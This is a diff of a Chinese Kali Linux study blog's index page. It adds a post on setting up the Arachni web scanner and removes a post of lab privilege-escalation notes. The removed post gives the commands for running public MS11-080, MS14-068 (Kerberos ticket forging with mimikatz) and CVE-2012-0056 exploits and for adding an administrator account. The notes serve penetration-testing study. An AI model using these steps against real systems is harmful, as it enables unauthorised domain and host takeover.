@@ -240,6 +240,255 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/29/Kali%20linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%80)%EF%BC%9AArachni/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/29/Kali%20linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%80)%EF%BC%9AArachni/" itemprop="url">Kali Linux笔记(四十一)：Arachni</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-29T10:51:56+08:00">
+                2019-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  473 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Arachni-▲-2019-12-29-软件扫描出问题"><a href="#1-Arachni-▲-2019-12-29-软件扫描出问题" class="headerlink" title="1. Arachni  ▲ 2019.12.29 软件扫描出问题"></a>1. Arachni  ▲ 2019.12.29 软件扫描出问题</h4><ul>
+<li>Kali 自带了旧的arachni阉割版</li>
+<li>安装<ul>
+<li><a href="http://www.arachni-scanner.com/download/#Linux" target="_blank" rel="noopener">http://www.arachni-scanner.com/download/#Linux</a></li>
+<li><strong><code>🔺命令：tar xvf arachni.tar.gz</code></strong></li>
+<li><a href="http://localhost:9292/" target="_blank" rel="noopener">http://localhost:9292/</a> （<a href="mailto:admin@admin.admin" target="_blank" rel="noopener">admin@admin.admin</a>/administrator）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Arachni"><a href="#2-Arachni" class="headerlink" title="2. Arachni"></a>2. Arachni</h4><ul>
+<li>Profile<ul>
+<li>Import</li>
+<li>Export</li>
+<li>New</li>
+</ul>
+</li>
+<li>Dispatcher<ul>
+<li><strong><code>🔺命令：./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></strong></li>
+</ul>
+</li>
+<li>Grid<ul>
+<li><strong><code>🔺命令：./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></strong></li>
+</ul>
+</li>
+<li>Scan</li>
+</ul>
+<h4 id="3-Arachni-→-Scan"><a href="#3-Arachni-→-Scan" class="headerlink" title="3. Arachni → Scan"></a>3. Arachni → Scan</h4><ul>
+<li>new scan<ul>
+<li>IP地址、配置文件、描述、共享</li>
+<li>Advanced options（Distribution/Scheduling）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ 一般的扫描器，要么是直连，要么是通过代理扫描，Arachni不一样，进行分布式扫描，进行负载均衡，每次扫描会生成多个Dispatcher，作为Remote，同一时间不同dispatcher可以扫描不同站点
+Direct：直接对目标主机进行扫描
+Remote：只有一个Dispatcher
+Grid：分布式，多个Dispatcher，网格类型</code></pre></blockquote>
+<h4 id="4-Arachni-→-Users"><a href="#4-Arachni-→-Users" class="headerlink" title="4. Arachni → Users"></a>4. Arachni → Users</h4><ul>
+<li>集成两个账号（Regular user/Administrator）</li>
+<li>可以新建一个新的账号</li>
+</ul>
+<h4 id="5-Arachni-→-Dispatched"><a href="#5-Arachni-→-Dispatched" class="headerlink" title="5. Arachni → Dispatched"></a>5. Arachni → Dispatched</h4><ul>
+<li>控制台创建一个新的Dispatched（<strong><code>🔺命令：./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></strong>）</li>
+<li>Web界面链接一个存在的Dispatched</li>
+</ul>
+<blockquote>
+<pre><code>▲ Dispatched可以工作在远端服务器，也可以工作在本地服务器上</code></pre></blockquote>
+<h4 id="6-Arachni-→-Scan"><a href="#6-Arachni-→-Scan" class="headerlink" title="6. Arachni → Scan"></a>6. Arachni → Scan</h4><ul>
+<li>通过Web界面链接一个Dispatched</li>
+<li>定义一个Scan，可以选择Remote/Guid</li>
+<li>在控制台对一个Dispatched加入一个新的Dispatched（<strong><code>🔺命令：./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></strong>）</li>
+</ul>
+<blockquote>
+<pre><code>▲ ?-s：大部分情况下，可以通过这一个命令，查看PHP源代码
+▲ 在指定加入组的Dispatched时，可以采用链式的形式，不要同时指向同一个Dipatched</code></pre></blockquote>
+<h4 id="7-Arachni-→-Profile"><a href="#7-Arachni-→-Profile" class="headerlink" title="7. Arachni → Profile"></a>7. Arachni → Profile</h4><ul>
+<li>Profiles Name<ul>
+<li>SQL injection</li>
+<li>Cross-Site Scripting（XSS）</li>
+<li>Default</li>
+</ul>
+</li>
+<li>Import</li>
+<li>New Profiles<ul>
+<li>Scope（扫描范围）</li>
+<li>Audit（扫描项目）</li>
+<li>Input（提交数据选项）（预设输入，建议修改，审计日志很容易发现）</li>
+<li>HTTP（HTTP选项）</li>
+<li>Platform fingerprinting（平台系统选择）</li>
+<li>Ckecks（扫描功能，主动模块和被动模块）</li>
+<li>Plugins（插件，发出提示等）（WAF_Detector）</li>
+<li>Session check（判断是否登陆成功）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3025,280 +3274,6 @@ ESS的ID：多个AP的SSID保持一致，统一的名字</code></pre></blockquot
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(三十一)：漏洞提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
-                2019-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-MS11-080"><a href="#1-MS11-080" class="headerlink" title="1. MS11-080"></a>1. MS11-080</h4><ul>
-<li>MS11-080（提权漏洞）<ul>
-<li><strong><code>🔺命令：searchploit MS11-080</code></strong></li>
-<li><strong><code>🔺命令：cp /usr/share/exploitdb/exploits/windows/local/18176.py</code></strong>（针对32位英文版操作系统）</li>
-<li><strong><code>🔺命令：cp 18176.py C:/Python2.7</code></strong></li>
-</ul>
-</li>
-<li>Kb2592799<ul>
-<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>查看升级的补丁：运行 → appwiz.cpl → show updates → remove</code></pre></blockquote>
-<ul>
-<li>Pywin32<ul>
-<li><a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/" target="_blank" rel="noopener">http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/</a></li>
-</ul>
-</li>
-<li>Pyinstaller（文件夹需要放到Python目录下,18176.c需要放到Pyinstaller文件夹中）<ul>
-<li><a href="https://pypi.org/project/PyInstaller/2.1/#files" target="_blank" rel="noopener">https://pypi.org/project/PyInstaller/2.1/#files</a></li>
-<li><strong><code>🔺命令：..\python pyinstaller.py --onefile 18176.py</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：18176.exe -O XP</code></strong></li>
-<li><strong><code>🔺命令：net localgroup administartor a /add</code></strong>（增加本地账号到管理员组）</li>
-</ul>
-<h4 id="2-MS11-046（拒绝服务）"><a href="#2-MS11-046（拒绝服务）" class="headerlink" title="2. MS11-046（拒绝服务）"></a>2. MS11-046（拒绝服务）</h4><ul>
-<li>Dos</li>
-</ul>
-<blockquote>
-<pre><code>公司若通过域环境管理电脑，统一分配软件和权限，一般安全性很高
-在没有安装python环境的机子，可将脚本编译成exe文件（需要Pyinstaller、Pywin32）</code></pre></blockquote>
-<h4 id="3-MS14-068"><a href="#3-MS14-068" class="headerlink" title="3. MS14-068"></a>3. MS14-068</h4><ul>
-<li>MS14-068（远程漏洞利用）</li>
-</ul>
-<blockquote>
-<pre><code>Windows XP系统利用不成
-Windows 7系统利用成功 lab\u1 penbox\w7</code></pre></blockquote>
-<ul>
-<li>库<ul>
-<li><a href="https://github.com/mubix/pykek（ms14-068.py）" target="_blank" rel="noopener">https://github.com/mubix/pykek（ms14-068.py）</a></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：searchexploit ms14-068</code></strong></li>
-<li>/usr/share/exploitdb/platforms/windows/remote/35474.py</li>
-<li><strong><code>🔺命令：python 35474.py/ms14-068.py -u user@lab.com -s userSID -d dc.lab.com</code></strong> ▲2019.12.22 35473.py/ms14-068.py脚本报错（域控制名称，如果不在域中，只能输入域控制器的IP地址）<ul>
-<li>会生成一个TGT文件票据（包含普通用户提升到管理员账号）</li>
-</ul>
-</li>
-<li>输入u1的密码</li>
-<li>拷贝<a href="mailto:TGT_user1@lab.com.ccache" target="_blank" rel="noopener">TGT_user1@lab.com.ccache</a>到提权windows系统</li>
-<li>本地管理系统<ul>
-<li><strong><code>🔺命令：minikatz.exe log &quot;kerberos::ptc TGT user@lab.com.ccache&quot; exit</code></strong></li>
-<li>访问管理共享：<strong><code>🔺命令：net use\\完整的域控制器名称\admin$</code></strong></li>
-<li>访问域控制器C盘：运行 → \完整的域控制器名称\c$</li>
-<li>打开修改注册表：regedit → 连接网络注册表 → 域控制器IP地址 → 账号：<a href="mailto:user1@lab.com" target="_blank" rel="noopener">user1@lab.com</a> 密码</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>域管理：安全边界（有一台计算机作为管理机，可通过一台机器管理所有域内的机器）
-服务器升级为域服务器的时候，会自动把Administartor升级为域服务器管理机
-搭建域控制器Windows Server2003：
-1.配置静态IP地址，DNS服务器指向自己
-2.运行域程序的安装：dcpromo（安装过程需要光盘）
-3.DNS全名：lab.com
-4.分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）
-5.加入域的计算机，在lab.com，Computer可以管理加入域的机器，需要Administrator登陆域接收器关闭防火墙
-6.管理加入域的机器，删除域接受器本地的账号，在域接收器本地的Administrator组中加入一个新的u1域的账号，检查名称，u1具有域接收器本地管理员权限，不对其他域机器有管理员权限（可以不设置，为了后面实验）
-搭建域接受器Windows XP：
-1.准备 → 关闭防火墙 → 配置静态IP地址（DNS指向域控制器）
-2.我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）
-3.共享资源\\lab.com
-5.获取SID： 通过whoami /all 查看域的SID
-6.net view：查看域控制器完整名称</code></pre></blockquote>
-<h4 id="4-CVE-2012-0056"><a href="#4-CVE-2012-0056" class="headerlink" title="4. CVE-2012-0056"></a>4. CVE-2012-0056</h4><ul>
-<li>Ubuntu11.10<ul>
-<li><a href="http://old-releases.ubuntu.com/releases/11.10" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10</a></li>
-<li><strong><code>🔺命令：searchexploit 18411.c</code></strong>（Kali上）</li>
-<li>Linux之间拷贝文件: <strong><code>🔺命令：SCP 文件 账号@IP地址：存放路径</code></strong>（通过SSH隧道，Kali端）</li>
-</ul>
-</li>
-<li>gcc（exploit-db/searchexploit都有存在EXP） <ul>
-<li><strong><code>🔺命令：mount /dev/cdrom /media/cdrom</code></strong>（挂载CD光盘设备）</li>
-<li><strong><code>🔺命令：sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</code></strong>（ubuntu停止安装更新源）</li>
-<li><strong><code>🔺命令：sudo apt-get install openssh-server</code></strong></li>
-<li><strong><code>🔺命令：gcc 18411.c -o exp</code></strong></li>
-</ul>
-</li>
-<li>CVE-2012-0056（操作系统内核对用户进程控制权限不严格）<ul>
-<li>/proc/pid/mem</li>
-<li>kernels&lt;=2.6.39</li>
-<li><a href="http://blog.zx2c4.com/749（漏洞详细原理）" target="_blank" rel="noopener">http://blog.zx2c4.com/749（漏洞详细原理）</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>/proc目录：内存中生成的临时/proc，保存了内存的实时数据，每生成一个进程，对应分配的PID，都会在这里创建一个目录
-Ubuntu下：id查看当前用户信息
-#：root用户提示符；$：普通用户提示符</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3353,7 +3328,7 @@ Ubuntu下：id查看当前用户信息
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">168</span>
+                  <span class="site-state-item-count">169</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3460,7 +3435,7 @@ Ubuntu下：id查看当前用户信息
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">151.3k</span>
+    <span title="Site words total count">152k</span>
   
 </div>
 
